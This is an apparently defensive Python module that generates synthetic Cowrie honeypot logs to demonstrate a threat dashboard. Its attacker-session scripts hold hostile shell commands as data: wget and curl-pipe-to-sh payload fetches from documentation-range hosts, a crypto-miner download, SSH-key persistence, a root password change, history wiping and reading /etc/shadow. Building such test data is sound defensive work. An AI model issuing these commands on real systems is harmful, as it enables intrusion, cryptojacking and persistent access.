"""Deterministic SYNTHETIC demo data in Cowrie's JSON format.

Purpose: let the dashboard and pipeline be demonstrated at realistic volume
without a deployed sensor. Everything produced here is labelled
``data_origin=synthetic`` end to end.

Safety properties:
* Source IPs come only from the RFC 5737 documentation ranges 192.0.2.0/24 and
  203.0.113.0/24, and payload URLs only from 198.51.100.0/24. None of these are
  routable, so no real host is ever implicated.
* Passwords come from a short list of generic dictionary words, not from any
  captured data.
* Enrichment records are marked ``status: synthetic``; the severity engine
  ignores them for escalation.
"""

from __future__ import annotations

import json
import random
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any

SENSOR = "synthetic-demo"
COMMON_USERS = ["root", "admin", "ubuntu", "test", "user", "oracle", "postgres", "pi", "git", "deploy",
                "ftpuser", "guest", "support", "hadoop", "jenkins", "minecraft", "ubnt", "debian"]
COMMON_PASSWORDS = ["123456", "password", "admin", "root", "12345678", "qwerty", "123456789", "1234",
                    "admin123", "toor", "changeme", "P@ssw0rd", "welcome1", "letmein", "raspberry",
                    "ubnt", "test123", "passw0rd", "111111", "default", "abc123", "Password1"]
CLIENTS = ["SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-OpenSSH_8.4p1", "SSH-2.0-paramiko_3.4.0",
           "SSH-2.0-libssh2_1.10.0", "SSH-2.0-PuTTY_Release_0.80", "SSH-2.0-OpenSSH_7.4"]
# (country code, country, approximate capital coordinates) - used only for synthetic geo labels.
COUNTRIES = [("CN", "China", 39.9, 116.4), ("US", "United States", 38.9, -77.0), ("RU", "Russia", 55.8, 37.6),
             ("BR", "Brazil", -15.8, -47.9), ("IN", "India", 28.6, 77.2), ("VN", "Vietnam", 21.0, 105.8),
             ("DE", "Germany", 52.5, 13.4), ("NL", "Netherlands", 52.4, 4.9), ("KR", "South Korea", 37.6, 127.0),
             ("ID", "Indonesia", -6.2, 106.8), ("SG", "Singapore", 1.35, 103.8), ("FR", "France", 48.9, 2.35),
             ("IR", "Iran", 35.7, 51.4), ("TW", "Taiwan", 25.0, 121.5), ("GB", "United Kingdom", 51.5, -0.1),
             ("HK", "Hong Kong", 22.3, 114.2), ("UA", "Ukraine", 50.45, 30.5), ("BG", "Bulgaria", 42.7, 23.3)]
COUNTRY_WEIGHTS = [22, 14, 9, 7, 7, 6, 5, 5, 4, 4, 3, 3, 2, 2, 2, 2, 2, 1]

RECON = ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "whoami", "id", "w", "free -m", "nproc",
         "lscpu | grep Model", "cat /etc/os-release", "ifconfig", "ps aux", "netstat -tulpn", "df -h",
         "uptime", "ls -la /tmp", "crontab -l", "cat /etc/passwd", "hostname"]


class _Builder:
    def __init__(self, rng: random.Random) -> None:
        self.rng = rng
        self.records: list[dict[str, Any]] = []

    def emit(self, ts: datetime, eventid: str, session: str, ip: str, **fields) -> None:
        record = {"eventid": eventid, "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.%fZ"), "session": session,
                  "src_ip": ip, "sensor": SENSOR, "protocol": fields.pop("protocol", "ssh")}
        record.update(fields)
        self.records.append(record)

    def session(self, ts: datetime, ip: str, protocol: str = "ssh") -> tuple[str, datetime]:
        sid = uuid.UUID(int=self.rng.getrandbits(128)).hex[:12]
        port = 22 if protocol == "ssh" else 23
        self.emit(ts, "cowrie.session.connect", sid, ip, protocol=protocol, src_port=self.rng.randint(1025, 65535),
                  dst_ip="10.42.1.10", dst_port=port, message=f"New connection: {ip}")
        if protocol == "ssh":
            self.emit(ts + timedelta(milliseconds=200), "cowrie.client.version", sid, ip,
                      version=self.rng.choice(CLIENTS))
            self.emit(ts + timedelta(milliseconds=300), "cowrie.client.kex", sid, ip,
                      hassh=f"{self.rng.getrandbits(128):032x}")
        return sid, ts + timedelta(seconds=1)

    def close(self, ts: datetime, sid: str, ip: str, started: datetime, protocol: str = "ssh") -> None:
        self.emit(ts, "cowrie.session.closed", sid, ip, protocol=protocol,
                  duration=round((ts - started).total_seconds(), 2))

    def login(self, ts: datetime, sid: str, ip: str, user: str, password: str, ok: bool, protocol: str = "ssh") -> None:
        self.emit(ts, "cowrie.login.success" if ok else "cowrie.login.failed", sid, ip, protocol=protocol,
                  username=user, password=password)

    def command(self, ts: datetime, sid: str, ip: str, cmd: str) -> None:
        self.emit(ts, "cowrie.command.input", sid, ip, input=cmd)


def generate(days: int = 7, seed: int = 1337, now: datetime | None = None) -> tuple[list[str], dict[str, dict]]:
    """Return (cowrie_json_lines, synthetic_enrichment_by_ip)."""
    rng = random.Random(seed)
    now = (now or datetime.now(timezone.utc)).replace(microsecond=0)
    start = now - timedelta(days=days)
    b = _Builder(rng)
    pool = [f"192.0.2.{i}" for i in range(2, 255)] + [f"203.0.113.{i}" for i in range(2, 255)]
    rng.shuffle(pool)
    ips = iter(pool)

    def when() -> datetime:
        # Diurnal-ish distribution with a bias toward recent days.
        offset = rng.triangular(0, days * 86400, days * 86400 * 0.7)
        return start + timedelta(seconds=offset)

    profiles: dict[str, str] = {}

    # 1. Scanners / banner grabbers: connect and leave.
    for _ in range(120):
        ip = next(ips)
        profiles[ip] = "scanner"
        for _ in range(rng.randint(1, 3)):
            t = when()
            sid, t2 = b.session(t, ip, rng.choice(["ssh", "ssh", "ssh", "telnet"]))
            b.close(t2 + timedelta(seconds=rng.uniform(0.5, 5)), sid, ip, t)

    # 2. Brute forcers against root/admin.
    for _ in range(70):
        ip = next(ips)
        profiles[ip] = "bruteforce"
        t = when()
        attempts = rng.choice([12, 18, 25, 40, 60, 90, 140])
        users = rng.sample(["root", "admin", "ubuntu", "test"], k=rng.randint(1, 2))
        per_session = rng.randint(3, 6)
        for i in range(0, attempts, per_session):
            sid, tt = b.session(t, ip)
            for _ in range(min(per_session, attempts - i)):
                tt += timedelta(seconds=rng.uniform(0.3, 2.5))
                b.login(tt, sid, ip, rng.choice(users), rng.choice(COMMON_PASSWORDS), False)
            b.close(tt + timedelta(seconds=1), sid, ip, t)
            t = tt + timedelta(seconds=rng.uniform(1, 8))
            if rng.random() < 0.15:
                for _ in range(rng.randint(1, 3)):  # periodic retry of the same pair
                    sid, tt = b.session(t, ip)
                    b.login(tt, sid, ip, users[0], "123456", False)
                    b.close(tt + timedelta(seconds=1), sid, ip, t)
                    t = tt + timedelta(seconds=2)

    # 3. Password sprayers: one password, many usernames.
    for _ in range(12):
        ip = next(ips)
        profiles[ip] = "spray"
        t = when()
        password = rng.choice(["Welcome2026!", "Summer2026", "Company123", "changeme"])
        sid, tt = b.session(t, ip)
        for user in rng.sample(COMMON_USERS, k=rng.randint(6, 12)):
            tt += timedelta(seconds=rng.uniform(0.5, 2))
            b.login(tt, sid, ip, user, password, False)
        b.close(tt + timedelta(seconds=1), sid, ip, t)

    # 4. Combo-list credential stuffing.
    for _ in range(8):
        ip = next(ips)
        profiles[ip] = "stuffing"
        t = when()
        sid, tt = b.session(t, ip)
        for _ in range(rng.randint(25, 45)):
            tt += timedelta(seconds=rng.uniform(0.3, 1.2))
            b.login(tt, sid, ip, rng.choice(COMMON_USERS), f"{rng.choice(COMMON_PASSWORDS)}{rng.randint(0, 999)}", False)
        b.close(tt + timedelta(seconds=1), sid, ip, t)

    # 5. Botnet sharing one credential pair across many IPs.
    botnet_pair = ("admin", "admin1234")
    for _ in range(9):
        ip = next(ips)
        profiles[ip] = "botnet"
        t = start + timedelta(days=days - 1, seconds=rng.uniform(0, 80000))
        sid, tt = b.session(t, ip, "telnet")
        b.login(tt, sid, ip, *botnet_pair, False, protocol="telnet")
        b.close(tt + timedelta(seconds=2), sid, ip, t, protocol="telnet")

    def interactive(kind: str, n: int) -> None:
        for _ in range(n):
            ip = next(ips)
            profiles[ip] = kind
            t = when()
            sid, tt = b.session(t, ip)
            for _ in range(rng.randint(0, 4)):
                tt += timedelta(seconds=rng.uniform(0.5, 2))
                b.login(tt, sid, ip, "root", rng.choice(COMMON_PASSWORDS), False)
            tt += timedelta(seconds=1)
            b.login(tt, sid, ip, "root", rng.choice(["root", "123456", "admin", "toor"]), True)
            for cmd in script_for(kind):
                tt += timedelta(seconds=rng.uniform(0.4, 6))
                b.command(tt, sid, ip, cmd)
                if "wget" in cmd or "curl" in cmd:
                    from honeytrap.detection.commands import extract_urls
                    for url in extract_urls(cmd):
                        b.emit(tt + timedelta(seconds=2), "cowrie.session.file_download.failed", sid, ip, url=url)
            if kind == "tunnel":
                b.emit(tt + timedelta(seconds=1), "cowrie.direct-tcpip.request", sid, ip,
                       dst_ip="198.51.100.10", dst_port=443, src_port=0)
            b.close(tt + timedelta(seconds=rng.uniform(2, 20)), sid, ip, t)

    def script_for(kind: str) -> list[str]:
        recon = rng.sample(RECON, k=rng.randint(2, 6))
        host = f"198.51.100.{rng.randint(2, 254)}"
        if kind == "recon":
            return recon
        if kind == "loader":
            arch = rng.choice(["x86", "arm7", "mips"])
            return recon[:2] + [f"cd /tmp || cd /var/run; wget http://{host}/bins/{arch}; chmod +x {arch}; ./{arch} ssh.root",
                                "rm -rf /tmp/*"]
        if kind == "piped":
            return recon[:1] + [f"curl -fsSL http://{host}/i.sh | sh", "history -c"]
        if kind == "miner":
            return recon[:3] + [f"wget -q http://{host}/xmrig.tar.gz -O /tmp/.x.tgz",
                                "tar xzf /tmp/.x.tgz -C /tmp", "cd /tmp/.x && ./xmrig -o stratum+tcp://pool.example.invalid:3333 --donate-level 1 -B",
                                "pkill -9 aliyun-service"]
        if kind == "persist":
            return recon[:2] + ["mkdir -p ~/.ssh", "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdemo synthetic@demo' >> ~/.ssh/authorized_keys",
                                "chattr +i ~/.ssh/authorized_keys", "echo 'root:Xk29s!aa' | chpasswd", "unset HISTFILE"]
        if kind == "tunnel":
            return recon[:1]
        if kind == "scanner_pivot":
            return recon[:2] + ["nmap -sS -p22,23,2375 10.0.0.0/24", "cat /etc/shadow"]
        return recon

    interactive("recon", 25)
    interactive("loader", 14)
    interactive("piped", 6)
    interactive("miner", 5)
    interactive("persist", 5)
    interactive("tunnel", 3)
    interactive("scanner_pivot", 3)

    # 6. Repeat visitors: a few IPs come back many times.
    repeaters = [ip for ip, k in profiles.items() if k == "bruteforce"][:6]
    for ip in repeaters:
        base = when()
        for i in range(rng.randint(5, 9)):
            t = base + timedelta(minutes=37 * i)
            sid, tt = b.session(t, ip)
            b.login(tt, sid, ip, "root", rng.choice(COMMON_PASSWORDS), False)
            b.close(tt + timedelta(seconds=1), sid, ip, t)

    # 7. A connection flood from one scanner (high-frequency rule).
    flood_ip = next(ips)
    profiles[flood_ip] = "flood"
    t = now - timedelta(hours=5)
    for i in range(35):
        sid, tt = b.session(t + timedelta(seconds=i * 1.5), flood_ip)
        b.close(tt + timedelta(milliseconds=300), sid, flood_ip, t)

    b.records.sort(key=lambda r: r["timestamp"])
    lines = [json.dumps(r, sort_keys=True) for r in b.records]

    enrichment = {}
    fetched = now.strftime("%Y-%m-%dT%H:%M:%SZ")
    for ip, kind in profiles.items():
        cc, country, lat, lon = rng.choices(COUNTRIES, weights=COUNTRY_WEIGHTS)[0]
        base_score = {"scanner": 35, "bruteforce": 70, "spray": 60, "stuffing": 65, "botnet": 85, "recon": 55,
                      "loader": 95, "piped": 90, "miner": 92, "persist": 80, "tunnel": 60, "scanner_pivot": 75,
                      "flood": 50}[kind]
        score = max(0, min(100, int(rng.gauss(base_score, 12))))
        enrichment[ip] = {
            "ip": ip,
            "status": "synthetic",
            "fetched_at": fetched,
            "note": "SYNTHETIC demo enrichment - not a real threat-intelligence lookup",
            "sources": {
                "abuseipdb": {"status": "synthetic", "abuse_confidence_score": score,
                              "total_reports": int(score * rng.uniform(0.5, 6)), "country_code": cc,
                              "isp": f"Example Hosting AS{64496 + rng.randint(0, 15)} (synthetic)"},
                "geoip": {"status": "synthetic", "country_code": cc, "country": country,
                          "latitude": round(lat + rng.uniform(-1.5, 1.5), 3),
                          "longitude": round(lon + rng.uniform(-1.5, 1.5), 3)},
            },
        }
    return lines, enrichment
